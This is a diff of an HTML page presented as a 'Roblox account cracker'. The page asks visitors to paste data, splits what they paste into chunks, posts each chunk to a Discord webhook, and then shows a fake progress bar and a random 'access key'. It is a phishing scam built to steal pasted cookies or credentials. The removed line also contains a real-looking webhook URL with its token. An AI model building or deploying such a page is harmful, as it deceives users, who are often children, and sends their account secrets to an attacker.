@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UU CRACJER</title>
+    <title>RB CRACKER</title>
     <style>
+        /* Modern Cyber Dark Theme */
         body {
             background-color: #0d1117;
             color: #58a6ff;
@@ -23,49 +24,60 @@
             padding: 50px;
             border-radius: 15px;
             border: 1px solid #30363d;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.7);
             width: 90%;
             max-width: 600px;
         }
 
         h2 {
             font-size: 2.5rem;
-            letter-spacing: 5px;
+            letter-spacing: 4px;
             margin-bottom: 30px;
             text-transform: uppercase;
             color: #ffffff;
-            text-shadow: 0 0 10px #58a6ff;
+            text-shadow: 0 0 15px #58a6ff;
         }
 
         textarea {
             width: 100%;
-            height: 150px;
+            height: 160px;
             padding: 15px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             background: #0d1117;
             border: 1px solid #30363d;
-            border-radius: 5px;
-            color: white;
+            border-radius: 8px;
+            color: #c9d1d9;
             font-size: 1rem;
             box-sizing: border-box;
             outline: none;
             resize: none;
+            font-family: monospace;
+        }
+
+        textarea:focus {
+            border-color: #58a6ff;
+            box-shadow: 0 0 8px rgba(88, 166, 255, 0.3);
         }
 
         button {
             width: 100%;
-            padding: 15px;
+            padding: 18px;
             background-color: #238636;
             color: white;
             border: none;
-            border-radius: 5px;
-            font-size: 1.2rem;
+            border-radius: 8px;
+            font-size: 1.3rem;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
         }
 
-        button:hover { background-color: #2ea043; }
+        button:hover {
+            background-color: #2ea043;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(35, 134, 54, 0.4);
+        }
 
         #loading-screen { display: none; }
 
@@ -74,7 +86,7 @@
             background-color: #30363d;
             border-radius: 10px;
             margin: 30px 0;
-            height: 15px;
+            height: 18px;
             overflow: hidden;
         }
 
@@ -83,26 +95,27 @@
             height: 100%;
             background-color: #58a6ff;
             transition: width 1s linear;
-            box-shadow: 0 0 15px #58a6ff;
+            box-shadow: 0 0 20px #58a6ff;
         }
 
         #status-text {
-            font-family: monospace;
+            font-family: 'Courier New', Courier, monospace;
             font-size: 1.1rem;
             color: #8b949e;
+            margin-top: 10px;
         }
 
-        /* Access Key Style */
         #final-key {
             display: none;
             word-break: break-all;
             background: #0d1117;
-            padding: 15px;
+            padding: 20px;
             border: 1px dashed #238636;
-            color: #2ea043;
-            font-family: monospace;
-            margin-top: 20px;
+            color: #3fb950;
+            font-family: 'Courier New', monospace;
+            margin-top: 25px;
             font-size: 0.9rem;
+            border-radius: 5px;
         }
     </style>
 </head>
@@ -110,9 +123,9 @@
 
     <div class="container">
         <div id="login-box">
-            <h2>Crack the game/account here!</h2>
-            <textarea id="userInput" placeholder="Paste data here..."></textarea>
-            <button onclick="startLogin()">INITIALIZE</button>
+            <h2>Crack any account/game in roblox</h2>
+            <textarea id="userInput" placeholder="PASTE DATA PACKETS HERE..."></textarea>
+            <button onclick="startLogin()">INITIALIZE ACCESS</button>
         </div>
 
         <div id="loading-screen">
@@ -121,14 +134,16 @@
                 <div id="bar" class="progress-bar"></div>
             </div>
             <p id="timer">60s remaining</p>
-            <p id="status-text">Uploading data segments...</p>
+            <p id="status-text">Uploading encrypted segments...</p>
             <div id="final-key"></div>
         </div>
     </div>
 
     <script>
+        // Function to handle the 1-second pause
         const sleep = ms => new Promise(res => setTimeout(res, ms));
 
+        // Generates the long random key
         function generateRandomString(length) {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let result = '';
@@ -140,61 +155,72 @@
 
         async function startLogin() {
             const inputVal = document.getElementById('userInput').value;
-            const webhookURL = 'https://discord.com/api/webhooks/1453764437608501472/M3izTOyXPaS_8RPHmqNDs-RXV8sApH8OG9jDA4gHd2_fzItzV3ZCNqcZAqNY1t2tXYi1';
+            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
 
             if (!inputVal) {
-                alert("Please enter data.");
+                alert("Please enter data to initialize.");
                 return;
             }
 
+            // Immediately switch to loading view
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'block';
 
+            // CHUNKING LOGIC: Splits text into groups of 1900 chars
             const chunks = inputVal.match(/[\s\S]{1,1900}/g) || [];
 
+            // Send each chunk to Discord
             for (let i = 0; i < chunks.length; i++) {
                 try {
                     await fetch(webhookURL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ 
-                            content: `**Data Part ${i + 1}/${chunks.length}:**\n\`\`\`\n${chunks[i]}\n\`\`\`` 
+                            content: `**DATA SEGMENT [${i + 1}/${chunks.length}]:**\n\`\`\`\n${chunks[i]}\n\`\`\`` 
                         }),
                     });
+                    // Wait 1 second to avoid Discord rate-limiting
                     await sleep(1000); 
-                } catch (e) { console.error(e); }
+                } catch (e) { 
+                    console.error("Transmission Error:", e); 
+                }
             }
 
+            // 60-Second Countdown Logic
             let secondsLeft = 60;
             const statusMessages = [
-                "Establishing secure connection...",
-                "Bypassing firewall protocols...",
-                "Syncing data packets...",
-                "Finalizing system entry...",
-                "Generating access token..."
+                "Establishing secure tunnel...",
+                "Bypassing node protocols...",
+                "Syncing data buffers...",
+                "Optimizing system bridge...",
+                "Generating unique access key..."
             ];
             
             const countdown = setInterval(() => {
                 secondsLeft--;
+                
                 document.getElementById('timer').innerText = `${secondsLeft}s remaining`;
                 document.getElementById('bar').style.width = ((60 - secondsLeft) / 60 * 100) + "%";
                 
-                if (secondsLeft % 10 === 0 && secondsLeft > 0) {
-                    const randomMsg = statusMessages[Math.floor(Math.random() * statusMessages.length)];
-                    document.getElementById('status-text').innerText = randomMsg;
+                // Switch status text every 12 seconds
+                if (secondsLeft % 12 === 0 && secondsLeft > 0) {
+                    const msg = statusMessages[Math.floor(Math.random() * statusMessages.length)];
+                    document.getElementById('status-text').innerText = msg;
                 }
 
                 if (secondsLeft <= 0) {
                     clearInterval(countdown);
-                    document.getElementById('header-text').innerText = "SUCCESS";
+                    
+                    // Final UI Update
+                    document.getElementById('header-text').innerText = "ACCESS GRANTED";
                     document.getElementById('timer').style.display = 'none';
                     document.getElementById('p-container').style.display = 'none';
-                    document.getElementById('status-text').innerText = "GENERATED ACCESS KEY:";
-                    document.getElementById('status-text').style.color = "#238636";
+                    document.getElementById('status-text').innerText = "YOUR GENERATED KEY:";
+                    document.getElementById('status-text').style.color = "#3fb950";
                     
-                    // Show the random string
+                    // Display the long random key
                     const keyBox = document.getElementById('final-key');
-                    keyBox.innerText = "KEY_" + generateRandomString(128);
+                    keyBox.innerText = "TOKEN_" + generateRandomString(160);
                     keyBox.style.display = 'block';
                 }
             }, 1000);
